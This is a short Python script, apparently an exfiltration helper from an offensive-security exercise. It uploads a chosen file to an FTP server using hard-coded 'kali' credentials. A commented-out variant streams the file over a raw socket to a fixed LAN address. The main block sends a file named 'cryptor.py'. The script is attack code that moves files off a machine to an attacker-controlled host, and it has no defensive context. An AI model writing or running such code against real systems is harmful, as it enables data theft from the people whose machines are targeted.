import ftplib
import os
import socket
# import win32file

def plain_ftp(docpath, server=''):
	ftp = ftplib.FTP(server)
	ftp.login("kali", "kali")
	ftp.cwd('/pub/')
	ftp.storbinary("STOR " + os.path.basename(docpath), open(docpath, "rb"), 1024)
	ftp.quit()

# def transmit(document_path):
# 	client = socket.socket()
# 	client.connect(('192.168.1.207', 10000))
# 	with open(document_path, 'rb') as f:
# 		win32file.TransmitFile(client, win32file._get_osfhandle(f.fileno()), 0, 0, None, 0, b'', b'')

if __name__ == '__main__':
	plain_ftp('./cryptor.py')